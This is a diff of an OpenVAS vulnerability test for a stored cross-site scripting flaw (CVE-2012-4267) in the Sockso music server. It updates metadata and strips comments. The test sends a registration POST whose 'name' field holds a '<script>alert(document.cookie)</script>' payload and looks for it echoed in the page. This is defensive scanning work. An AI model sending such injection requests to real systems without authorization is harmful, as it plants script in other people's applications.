@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sockso_registration_persistent_xss_vuln.nasl 6697 2017-07-12 11:40:05Z cfischer $
+# $Id: gb_sockso_registration_persistent_xss_vuln.nasl 10941 2018-08-13 14:33:26Z asteins $
 #
 # Sockso Registration Persistent Cross Site Scripting Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802853");
-  script_version("$Revision: 6697 $");
+  script_version("$Revision: 10941 $");
   script_cve_id("CVE-2012-4267");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-13 16:33:26 +0200 (Mon, 13 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-05-14 13:06:50 +0530 (Mon, 14 May 2012)");
   script_name("Sockso Registration Persistent Cross Site Scripting Vulnerability");
 
@@ -55,8 +55,8 @@ if(description)
   script_tag(name:"affected", value:"Sockso version 1.51 and prior");
   script_tag(name:"insight", value:"The flaw is due to improper validation of user supplied input
   via the 'name' parameter to user or register.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
   features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"The host is running Sockso and is prone to persistent cross site
@@ -71,40 +71,27 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-url = "";
-port = 0;
-req = "";
-res = "";
-banner = "";
-postdata = "";
-
 ## Stored XSS (Not a safe check)
 if(safe_checks()){
   exit(0);
 }
 
-## Get Sockso Port
 port = get_http_port(default:4444);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if(!banner || "Server: Sockso" >!< banner){
   exit(0);
 }
 
-## Construct attack request
 url = "/user/register";
 postdata = "todo=register&name="+ rand() + "<script>alert(document.cookie)" +
            "</script>&pass1=abc&pass2=abc&email=xyz"+ rand() +"%40gmail.com";
 
-## Construct POST Attack Request
 req = http_post(item:url, port:port, data:postdata);
 
 ## Send crafted request and receive the response
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Confirm exploit worked by checking the response
 if(res && res =~ "HTTP/1\.[0-9]+ 200" &&
    "<title>Sockso" >< res &&
    "<script>alert(document.cookie)</script>" >< res){
